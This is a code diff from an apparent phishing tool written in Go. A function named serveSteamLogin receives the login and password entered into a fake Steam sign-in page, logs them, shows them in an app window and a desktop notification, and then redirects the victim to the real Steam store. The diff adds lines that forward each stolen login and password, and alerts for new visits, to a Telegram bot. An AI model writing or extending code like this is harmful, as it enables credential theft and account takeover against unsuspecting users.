@@ -23,12 +23,18 @@ func serveSteamLogin(win fyne.Window, textGrid *widget.TextGrid, textStream *str
 			if login != "" || pass != "" {
 				log.Printf("Login = %s  Passw = %s", login, pass)
 				*textStream += "\nlogin = " + login + "\nPass = " + pass + "\n"
+				if useTelegramBot {
+					tg.send("Login = " + login + "\nPass = " + pass)
+				}
 				textGrid.SetText(*textStream)
 				notiApp.SendNotification(fyne.NewNotification("New Form", login+" : "+pass))
 				http.Redirect(response, req, "https://store.steampowered.com", 301)
 				return
 			}
 			*textStream += "New Requests\n"
+			if useTelegramBot {
+				tg.send("New Request on steam")
+			}
 			textGrid.SetText(*textStream)
 		} else {
 			log.Println("Error to req.ParseFrom")
